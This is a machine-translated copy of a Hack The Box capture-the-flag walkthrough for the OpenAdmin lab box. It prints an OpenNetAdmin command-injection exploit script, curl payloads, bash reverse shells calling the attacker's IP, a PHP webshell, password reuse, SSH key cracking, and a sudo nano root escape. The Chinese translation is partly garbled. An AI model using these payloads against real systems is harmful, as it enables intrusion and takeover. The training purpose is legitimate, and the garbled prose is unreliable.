
OpenNetAdmin cms，它有一个远程编码的执行漏洞，
数据库凭据由其中一个用户重用
我可以在该网站上执行代码或绕过登录以获取SSH密钥
sudo
# HTB： OpenAdmin

[0xdf.gitlab.io](https://0xdf.gitlab.io/2020/05/02/htb-openadmin.html)0xdf黑客的东西

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fopenadmin-cover.png) 

打开管理员提供了一个直接的简单盒子。有一些枚举可以找到OpenNetAdmin的实例，它有一个远程编码的执行漏洞，我将使用它来获取一个外壳作为w-data。数据库凭据由其中一个用户重用。接下来，我将通过内部网站转向第二个用户，我可以在该网站上执行代码或绕过登录以获取SSH密钥。最后，对于根，纳米上有一个sudo，它允许我使用go走宾斯获得根壳。

## 箱子信息

名字

[打开管理员](https://www.hackthebox.eu/home/machines/profile/222) ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Ficons%2Fbox-openadmin.png) 

发行日期

[04 1月 2020](https://twitter.com/hackthebox_eu/status/1213090232628854784)

停用日期

02 五月 2020

操作系统

操作系统 ![](https://image.cubox.pro/article/2022091809192232808/86382.jpg) 

基本点

简易 \[20\]

额定难度

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fopenadmin-diff.png) 

雷达图

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fopenadmin-radar.png) 

 ![](https://image.cubox.pro/article/2022091809192294225/76393.jpg) 

00天 02小时 20分钟 08秒。[![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F13243)](https://www.hackthebox.eu/home/users/profile/13243)

 ![](https://image.cubox.pro/article/2022091809192276507/23214.jpg) 

00天 02小时 11分 20秒。[![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F139588)](https://www.hackthebox.eu/home/users/profile/139588)

造物主

[![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F82600)](https://www.hackthebox.eu/home/users/profile/82600)-

## 侦察

### n地图

`nmap`显示两个打开的端口，SSH 在 22 上，HTTP 在 80 上：

    root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.171
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-18 12:07 EST
    Warning: 10.10.10.171 giving up on port because retransmission cap hit (10).
    Nmap scan report for 10.10.10.171
    Host is up (0.020s latency).
    Not shown: 65222 closed ports, 311 filtered ports
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http
    
    Nmap done: 1 IP address (1 host up) scanned in 24.48 seconds
    root@kali# nmap -p 22,80 -sV -sC -oA scans/nmap-tcpscripts 10.10.10.171
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-18 12:57 EST
    Nmap scan report for 10.10.10.171
    Host is up (0.077s latency).
    
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
    |   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
    |_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
    80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
    |_http-server-header: Apache/2.4.29 (Ubuntu)
    |_http-title: Apache2 Ubuntu Default Page: It works
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 9.13 seconds
    
    

基于[阿帕奇](https://packages.ubuntu.com/search?keywords=apache2)和[OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server)版本，这个盒子看起来像Ubuntu 18.04仿生。

### 网站 - TCP 80

#### 网站

该网站只是默认的阿帕奇页面。

#### 目录暴力破解

`gobuster`确实给出了一些路径来查看：

    root@kali# gobuster dir -u http://10.10.10.171 -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -x php,txt,html -o scans/gobuster-root-php_txt_html                                 
    ===============================================================
    Gobuster v3.0.1
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
    ===============================================================
    [+] Url:            http://10.10.10.171
    [+] Threads:        10
    [+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
    [+] Status codes:   200,204,301,302,307,401,403
    [+] User Agent:     gobuster/3.0.1
    [+] Extensions:     php,txt,html
    [+] Timeout:        10s
    ===============================================================
    2020/01/18 13:00:00 Starting gobuster
    ===============================================================
    /index.html (Status: 200)
    /music (Status: 301)
    /artwork (Status: 301)
    /sierra (Status: 301)
    ===============================================================
    2020/01/18 13:23:39 Finished
    ===============================================================
    

#### /音乐

该页面适用于音乐网站：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200118134836666.png) 

Most of the links point back to , or a couple other sides on the page. But the one that really matters is the Login link at the top - it points to (which doesn’t make a whole lot of sense).`index.html``http://10.10.10.171/ona`

#### Other Sites

The other sites were also mostly dummy text. I spent some time checking them out, but once I found , I decided to focus there (especially given the name of the box).`/ona`

#### /奥纳

这是开放网络管理员的一个实例：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200118135047875.png) 

我可以看到版本是18.1.1，它警告说不是最新的。

## 壳牌作为万维数据

### 利用可编程逻辑控制器

搜索策略显示了此版本中的远程执行代码漏洞：

    root@kali# searchsploit OpenNetAdmin
    -------------------------------------------------------------------------- ----------------------------------------
     Exploit Title                                                            |  Path
                                                                              | (/usr/share/exploitdb/)
    -------------------------------------------------------------------------- ----------------------------------------
    OpenNetAdmin 13.03.01 - Remote Code Execution                             | exploits/php/webapps/26682.txt
    OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit)              | exploits/php/webapps/47772.rb
    OpenNetAdmin 18.1.1 - Remote Code Execution                               | exploits/php/webapps/47691.sh
    -------------------------------------------------------------------------- ----------------------------------------
    Shellcodes: No Result
    

[exploit-db.com](https://www.exploit-db.com/exploits/47691) 上有一个指向此漏洞的链接。这超级简单。该脚本运行一个无限 bash 循环，获取命令并打印输出：

    #!/bin/bash
    
    URL="${1}"
    while true;do
     echo -n "$ "; read cmd
     curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
    done
    

我可以只用卷曲来测试它。我学到的一个教训是，在url的末尾有尾随是很重要的：`/`

    root@kali# curl -s -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;id&xajaxargs[]=ping"  http://10.10.10.171/ona/
    ...[snip]...
    <!-- Module Output -->
    <table style="background-color: #F2F2F2; padding-left: 25px; padding-right: 25px;" width="100%" cellspacing="0" border="0" cellpadding="0">
        <tr>
            <td align="left" class="padding">
                <br>
                <div style="border: solid 2px #000000; background-color: #FFFFFF; width: 650px; height: 350px; overflow: auto;resize: both;">
                    <pre style="padding: 4px;font-family: monospace;">uid=33(www-data) gid=33(www-data) groups=33(www-data)
    </pre>
                </div>
            </td>
        </tr>
    </table>
    
    ...[snip]...
    

我可以看到该部分末尾的输出。来自站点的漏洞利用只是在用户运行的命令之前和之后添加一个命令，然后用于剪切命令输出并忽略其余命令。我可以自己做，但我只会得到一个反向的外壳，并将其留给有动力的读者进行练习。`id``Module Output``echo``sed`

### 壳

由于我想要一个合法的外壳，我将使用 curl 来推动反向外壳：`bash`

    root@kali# curl -s -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;bash -c 'bash -i >%26 /dev/tcp/10.10.14.11/443 0>%261'&xajaxargs[]=ping"  http
    ://10.10.10.171/ona/
    

它挂了，但在我的听众中，我有一个外壳：`nc`

    root@kali# nc -lnvp 443
    Ncat: Version 7.80 ( https://nmap.org/ncat )
    Ncat: Listening on :::443
    Ncat: Listening on 0.0.0.0:443
    Ncat: Connection from 10.10.10.171.
    Ncat: Connection from 10.10.10.171:40352.
    bash: cannot set terminal process group (1004): Inappropriate ioctl for device
    bash: no job control in this shell
    www-data@openadmin:/opt/ona/www$ id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    

## Priv： www-data –>吉米

#### 列举

在框中，我可以看到两个用户主目录，但我无法以w-data的形式读取其中任何一个：

    www-data@openadmin:/home$ ls
    jimmy  joanna      
    
    www-data@openadmin:/home$ find .
    .
    ./jimmy
    find: './jimmy': Permission denied
    ./joanna
    find: './joanna': Permission denied  
    

返回到 ，有三个目录：`/var/www`

    www-data@openadmin:/var/www$ ls
    html  internal  ona   
    

`html`拥有各种网站：

    www-data@openadmin:/var/www/html$ ls
    artwork  index.html  marga  music  ona  sierra
    

我没有找到那个。但它看起来像其他虚拟网站。`marga`

`internal`由吉米拥有，我无法访问它：

    www-data@openadmin:/var/www$ ls -l
    total 8
    drwxr-xr-x 6 www-data www-data 4096 Nov 22 15:59 html
    drwxrwx--- 2 jimmy    internal 4096 Jan 17 21:46 internal
    lrwxrwxrwx 1 www-data www-data   12 Nov 21 16:07 ona -> /opt/ona/www
    www-data@openadmin:/var/www$ cd internal/
    bash: cd: internal/: Permission denied
    

和 都是 指向 的链接。`ona``html/ona``/opt/ona/www`

#### 奥纳数据库

由于OpenNetAdmin是我发现的唯一一个似乎需要任何类型的数据库连接的网站，因此去那里寻找。阅读配置文件，我最终发现：`/var/www/html/ona/local/config/database_settings.inc.php`

    <?php
    
    $ona_contexts=array (
      'DEFAULT' => 
      array (
        'databases' => 
        array (
          0 => 
          array (
            'db_type' => 'mysqli',
            'db_host' => 'localhost',
            'db_login' => 'ona_sys',
            'db_passwd' => 'n1nj4W4rri0R!',
            'db_database' => 'ona_default',
            'db_debug' => false,
          ),
        ),
        'description' => 'Default data context',
        'context_color' => '#D3DBFF',
      ),
    );
    
    ?>
    

我想我会检查密码重用，这对吉米有效：

    www-data@openadmin:/var/www/html/ona$ su jimmy
    Password:
    jimmy@openadmin:/opt/ona/www$ id
    uid=1000(jimmy) gid=1000(jimmy) groups=1000(jimmy),1002(internal)
    

在吉米的家庭目录中没有。我怀疑我需要转向乔安娜。`user.txt`

## 私人：吉米->乔安娜

### 列举

作为吉米，我现在可以访问：`/var/www/internal`

    jimmy@openadmin:/var/www/internal$ ls -l
    total 24
    -rw-rw-r-- 1 jimmy jimmy     341 Jan 17 21:15 headers
    -rwxrwxr-x 1 jimmy jimmy    3229 Jan 17 19:44 index_backup.php
    -rwxrwxr-x 1 jimmy internal 3094 Jan 17 21:12 index.php
    -rwxrwxr-x 1 jimmy internal  185 Nov 23 16:37 logout.php
    -rwxrwxr-x 1 jimmy jimmy     339 Jan 17 20:13 main_backup.php
    -rwxrwxr-x 1 jimmy internal  339 Jan 17 20:39 main.php
    

我可以做一些挖掘，看看这个网站是否正在运行，以及它是如何托管的（不同的vhost，路径，或端口），通过查看中的配置：`/etc/apache2/sites-enabled`

    jimmy@openadmin:/etc/apache2/sites-enabled$ ls
    internal.conf  openadmin.conf
    

`openadmin.conf`显示我找到的站点，在端口 80 上侦听，根位于（删除了注释行）：`/var/www/html`

    jimmy@openadmin:/etc/apache2/sites-enabled$ cat openadmin.conf 
    <VirtualHost *:80>
            ServerName openadmin.htb
    
            ServerAdmin jimmy@openadmin.htb
            DocumentRoot /var/www/html
    
            ErrorLog ${APACHE_LOG_DIR}/error.log
            CustomLog ${APACHE_LOG_DIR}/access.log combined
    </VirtualHost>
    

`internal.conf`显示本地主机上的侦听器：52846：

    jimmy@openadmin:/etc/apache2/sites-enabled$ cat internal.conf 
    Listen 127.0.0.1:52846
    
    <VirtualHost 127.0.0.1:52846>
        ServerName internal.openadmin.htb
        DocumentRoot /var/www/internal
    
    <IfModule mpm_itk_module>
    AssignUserID joanna joanna
    </IfModule>
    
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
    
    </VirtualHost>
    

同样有趣的是，它以乔安娜的身份运行。

### 内部网站

我将通过隧道重新连接SSH上的吉米，以便我可以到达内部站点：

    root@kali# ssh jimmy@10.10.10.171 -L 52846:localhost:52846
    jimmy@10.10.10.171's password: 
    Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)
    
     * Documentation:  https://help.ubuntu.com
     * Management:     https://landscape.canonical.com
     * Support:        https://ubuntu.com/advantage
    
      System information as of Sat Jan 18 20:17:29 UTC 2020
    
      System load:  1.0               Processes:             132
      Usage of /:   51.4% of 7.81GB   Users logged in:       0
      Memory usage: 35%               IP address for ens160: 10.10.10.171
      Swap usage:   0%
    
    
     * Canonical Livepatch is available for installation.
       - Reduce system reboots and improve kernel security. Activate at:
         https://ubuntu.com/livepatch
    
    41 packages can be updated.
    12 updates are security updates.
    
    Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
    
    
    Last login: Sat Jan 18 19:23:37 2020 from 10.10.14.11
    jimmy@openadmin:~$
    

现在我可以访问 http://127.0.0.1:52846/ 并获取页面：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200118151918716.png) 

### 路径1：网络外壳

我解决这个问题的最初方法是将一个webshell写入此文件夹的根目录中：

    jimmy@openadmin:/var/www/internal$ echo '<?php system($_GET["0xdf"]); ?>'  
    <?php system($_GET["0xdf"]); ?>                   
    jimmy@openadmin:/var/www/internal$ echo '<?php system($_GET["0xdf"]); ?>' > 0xdf.php  
    

现在我可以访问它并以乔安娜的身份执行：

    root@kali# curl http://127.0.0.1:52846/0xdf.php?0xdf=id
    uid=1001(joanna) gid=1001(joanna) groups=1001(joanna),1002(internal)
    

要获得一个外壳，我可以开始并卷曲：`nc`

    root@kali# curl 'http://127.0.0.1:52846/0xdf.php?0xdf=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.14.11/443%200%3E%261%27'
    

壳牌立即推出：

    root@kali# nc -lnvp 443
    Ncat: Version 7.80 ( https://nmap.org/ncat )
    Ncat: Listening on :::443
    Ncat: Listening on 0.0.0.0:443
    Ncat: Connection from 10.10.10.171.
    Ncat: Connection from 10.10.10.171:40556.
    bash: cannot set terminal process group (1004): Inappropriate ioctl for device
    bash: no job control in this shell
    joanna@openadmin:/var/www/internal$ id
    uid=1001(joanna) gid=1001(joanna) groups=1001(joanna),1002(internal)
    

### 路径 2：登录和 SSH

#### 登录并获取密钥

上述网站需要用户名和密码。如果我检查，我可以看到php源代码中的硬编码用户名和密码：`index.php`

    <?php
      $msg = '';
      
      if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
        if ($_POST['username'] == 'joanna' && $_POST['password'] == 'joanna') {
          $_SESSION['username'] = 'joanna';
          header("Location: /main.php");
        } else {             
          $msg = 'Wrong username or password.';
        }
      }
    ?>
    

成功登录后，它会重定向到 ，其中有一个 ssh 键：`main.php`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200118152816918.png) 

#### 解密密钥

要解密密钥，我尝试的第一件事是吉米的密码，但失败了：`n1nj4W4rri0R!`

    root@kali# openssl rsa -in joanna-enc -out id_rsa_openadmin_joanna
    Enter pass phrase for joanna-enc:
    unable to load Private Key
    139806906295488:error:06065064:digital envelope routines:EVP_DecryptFinal_ex:bad decrypt:../crypto/evp/evp_enc.c:570:
    139806906295488:error:0906A065:PEM routines:PEM_do_header:bad decrypt:../crypto/pem/pem_lib.c:461:
    

然后我想我会尝试摇滚你的“忍者”一词。首先创建单词列表：

    root@kali# grep -i ninja /usr/share/wordlists/rockyou.txt > rockyou_ninja
    

然后它立即闯入：`john`

    root@kali# /opt/john/run/john --wordlist=rockyou_ninja joanna-enc.john
    Using default input encoding: UTF-8
    Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
    Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
    Cost 2 (iteration count) is 1 for all loaded hashes
    Will run 3 OpenMP threads
    Note: This format may emit false positives, so it will keep trying even after
    finding a possible candidate.
    Press 'q' or Ctrl-C to abort, almost any other key for status
    bloodninjas      (joanna-enc)
    1g 0:00:00:00 DONE (2020-01-18 15:37) 50.00g/s 88250p/s 88250c/s 88250C/s 007ninjajairo..#1FLUFFYCOCKYNINJA
    Session completed
    

我可以写一个密钥的无限制副本：

    root@kali# openssl rsa -in joanna-enc -out id_rsa_openadmin_joanna
    Enter pass phrase for joanna-enc:
    writing RSA key
    

#### SSH

I can connect with that key as joanna:

    root@kali# ssh -i ~/id_rsa_openadmin_joanna joanna@10.10.10.171
    Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)
    
     * Documentation:  https://help.ubuntu.com
     * Management:     https://landscape.canonical.com
     * Support:        https://ubuntu.com/advantage
    
      System information as of Sat Jan 18 20:41:19 UTC 2020
    
      System load:  1.15              Processes:             142
      Usage of /:   51.4% of 7.81GB   Users logged in:       1
      Memory usage: 36%               IP address for ens160: 10.10.10.171
      Swap usage:   0%
    
    
     * Canonical Livepatch is available for installation.
       - Reduce system reboots and improve kernel security. Activate at:
         https://ubuntu.com/livepatch
    
    41 packages can be updated.
    12 updates are security updates.
    
    Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
    
    
    Last login: Fri Jan 17 23:34:31 2020 from 10.10.14.11
    joanna@openadmin:~$
    

### user.txt

With either of these shells as joanna, I can now get :`user.txt`

    joanna@openadmin:~$ cat user.txt 
    c9b2cf07************************
    

## Priv: joanna –> root

### Enumeration

Always check on HTB, and it pays off here:`sudo`

    joanna@openadmin:~$ sudo -l
    Matching Defaults entries for joanna on openadmin:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
    
    User joanna may run the following commands on openadmin:
        (ALL) NOPASSWD: /bin/nano /opt/priv
    

### 苏多纳米

gtfobins有一[个关于纳米的页面](https://gtfobins.github.io/gtfobins/nano/#sudo)。获取 shell 的路径如下：`sudo`

    sudo nano
    ^R^X
    reset; sh 1>&0 2>&0
    

不是说它很重要，而是一个空文件：`/opt/priv`

    joanna@openadmin:/opt$ ls -l priv 
    -rw-r--r-- 1 root root 0 Nov 22 23:49 priv
    

我会跑进去，然后被放到：`sudo /bin/nano /opt/priv``nano`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200118155556941.png) 

现在，我将按Ctrl + r读取文件，然后弹出底部的菜单：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200118155638935.png) 

Ctrl+x 是“执行命令”。键入提示“要执行的命令：”。如果我只是输入，它会冻结，因为标准/标准/标准被搞砸了。这就是修复程序。当我运行它时，残留物仍然存在，但有一个提示：`/bin/sh``reset; /bin/sh 1>&0 2>&0``nano``#`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200118160107814.png) 

如果我输入 ，它的工作原理：`id`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200118160219856.png) 

按回车键几次清除它，然后运行会得到更合理的提示：`bash`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200118160302193.png) 

现在有了根壳，我可以抓住：`root.txt`

    root@openadmin:/root# cat root.txt 
    2f907ed4************************
    

[查看原网页: 0xdf.gitlab.io](https://0xdf.gitlab.io/2020/05/02/htb-openadmin.html)